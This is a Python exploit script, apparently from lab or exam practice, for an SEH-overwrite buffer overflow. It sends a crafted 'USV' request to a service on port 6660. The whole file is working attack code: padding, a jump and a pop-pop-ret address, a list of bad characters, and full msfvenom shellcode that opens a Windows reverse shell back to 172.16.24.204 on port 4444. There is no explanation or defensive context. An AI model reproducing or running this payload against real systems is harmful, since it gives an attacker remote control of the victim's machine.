#!/usr/bin/python

import socket

host = "10.0.2.16"
port = 6660

# pop, pop, ret 0x76AEA44F
SEH = "\x69\x0c\x07\x1b"
JMP = "\xeb\x07"

# BAD chars: \x00\x0a\x0d\x20\x25

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -a x86 -b "\x00\x0a\x0d\x20\x25"
buf =  b""
buf += b"\xdb\xdb\xbb\x1d\xf9\xa1\xd4\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x13\x03\x47\xea\x43"
buf += b"\x21\x8b\xe4\x06\xca\x73\xf5\x66\x42\x96\xc4\xa6\x30"
buf += b"\xd3\x77\x17\x32\xb1\x7b\xdc\x16\x21\x0f\x90\xbe\x46"
buf += b"\xb8\x1f\x99\x69\x39\x33\xd9\xe8\xb9\x4e\x0e\xca\x80"
buf += b"\x80\x43\x0b\xc4\xfd\xae\x59\x9d\x8a\x1d\x4d\xaa\xc7"
buf += b"\x9d\xe6\xe0\xc6\xa5\x1b\xb0\xe9\x84\x8a\xca\xb3\x06"
buf += b"\x2d\x1e\xc8\x0e\x35\x43\xf5\xd9\xce\xb7\x81\xdb\x06"
buf += b"\x86\x6a\x77\x67\x26\x99\x89\xa0\x81\x42\xfc\xd8\xf1"
buf += b"\xff\x07\x1f\x8b\xdb\x82\xbb\x2b\xaf\x35\x67\xcd\x7c"
buf += b"\xa3\xec\xc1\xc9\xa7\xaa\xc5\xcc\x64\xc1\xf2\x45\x8b"
buf += b"\x05\x73\x1d\xa8\x81\xdf\xc5\xd1\x90\x85\xa8\xee\xc2"
buf += b"\x65\x14\x4b\x89\x88\x41\xe6\xd0\xc4\xa6\xcb\xea\x14"
buf += b"\xa1\x5c\x99\x26\x6e\xf7\x35\x0b\xe7\xd1\xc2\x6c\xd2"
buf += b"\xa6\x5c\x93\xdd\xd6\x75\x50\x89\x86\xed\x71\xb2\x4c"
buf += b"\xed\x7e\x67\xc2\xbd\xd0\xd8\xa3\x6d\x91\x88\x4b\x67"
buf += b"\x1e\xf6\x6c\x88\xf4\x9f\x07\x73\x9f\x95\xd7\x79\x50"
buf += b"\xc2\xd5\x7d\x7f\x4e\x53\x9b\x15\x7e\x35\x34\x82\xe7"
buf += b"\x1c\xce\x33\xe7\x8a\xab\x74\x63\x39\x4c\x3a\x84\x34"
buf += b"\x5e\xab\x64\x03\x3c\x7a\x7a\xb9\x28\xe0\xe9\x26\xa8"
buf += b"\x6f\x12\xf1\xff\x38\xe4\x08\x95\xd4\x5f\xa3\x8b\x24"
buf += b"\x39\x8c\x0f\xf3\xfa\x13\x8e\x76\x46\x30\x80\x4e\x47"
buf += b"\x7c\xf4\x1e\x1e\x2a\xa2\xd8\xc8\x9c\x1c\xb3\xa7\x76"
buf += b"\xc8\x42\x84\x48\x8e\x4a\xc1\x3e\x6e\xfa\xbc\x06\x91"
buf += b"\x33\x29\x8f\xea\x29\xc9\x70\x21\xea\xf9\x3a\x6b\x5b"
buf += b"\x92\xe2\xfe\xd9\xff\x14\xd5\x1e\x06\x97\xdf\xde\xfd"
buf += b"\x87\xaa\xdb\xba\x0f\x47\x96\xd3\xe5\x67\x05\xd3\x2f"

buffer = "USV /.:/" + "A" * (962-len(JMP)) + JMP + SEH + "\x90" * 10 + buf + "C" * (5000 - 962 - len(JMP) - len(SEH) - 10 - len(buf)) + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()

